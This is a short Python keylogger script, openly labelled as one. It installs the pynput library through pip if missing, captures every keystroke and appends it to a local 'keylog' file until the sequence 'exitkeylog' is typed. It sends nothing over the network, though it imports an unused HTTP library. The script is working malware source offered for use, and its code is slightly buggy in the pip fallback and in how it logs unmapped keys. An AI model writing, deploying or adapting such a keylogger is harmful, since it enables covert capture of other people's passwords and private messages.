try:
    import pynput
except ModuleNotFoundError:
    import subprocess
    import sys
    try:    
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pynput'])

    except:
        subprocess.check_call([sys.executable, 'pip3', 'install', 'pynput'])


finally:
    import pynput
    import json
    import requests
    from pynput.keyboard import Key, Listener



intro="""
██╗  ██╗███████╗██╗   ██╗██╗      ██████╗  ██████╗  ██████╗ ███████╗██████╗ 
██║ ██╔╝██╔════╝╚██╗ ██╔╝██║     ██╔═══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗
█████╔╝ █████╗   ╚████╔╝ ██║     ██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝
██╔═██╗ ██╔══╝    ╚██╔╝  ██║     ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗
██║  ██╗███████╗   ██║   ███████╗╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║
╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
                           By Jael Gonzalez                                                                            

[*]Python script keylogger using Pynput Listener.
[*]Saves keystrokes and writes them into 'keylog' file in the directory the script is running.
[*]To stop keylogger, write the exit combination 'exitkeylog' [can be customized].
[*]If you mistype the exit combination, do not backspace [backspace itself is a key], instead, write it again.

"""
print(intro)
replacement = {
    'Key.enter' : '[ENTER]',
    'Key.caps_lock' : '[CAPSLOCK]',
    'Key.space' : '[SPACE]',
    'Key.shift' : '[SHIFT]',
    'Key.shift_r' : '[SHIFTR]',
    'Key.ctrl' : '[CONTROL]',
    'Key.ctrl_r' : '[CONTROLR]',
    'Key.alt' : '[ALT]',
    'Key.alt_r' : '[ALTR]',
    'Key.cmd' : '[CMD]',
    'Key.tab' : '[TAB]',
    'Key.esc' : '[ESC]',
    'Key.backspace' : '[BACKSPACE]'
}
#aaaisthisworkingstill?
key_list = []
    

def on_press(key):
    key_stroke=str(key)
    global key_list

    with open("keylog", 'a') as file:

        if len(key_list)==60:
            file.write('\n')

        if key_stroke in list(replacement.keys()):
            file.write(replacement[key_stroke])

        else:
            file.write(str(key)[1])


    key_list.append(str(key)[1])

    if (len(key_list)==200):
        key_list.clear()

    ##Escape sequence    
    if len(key_list)>=10:
        a = ""
        a = a.join(key_list[-10:])
        if (a=='exitkeylog'):               #Combination to exit keylog, can be changed. If changed, the length analyzied must also be changed.
            return False                    #Depending of when you write it, the code might not read it and must write it again

def on_release(key):
    pass

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()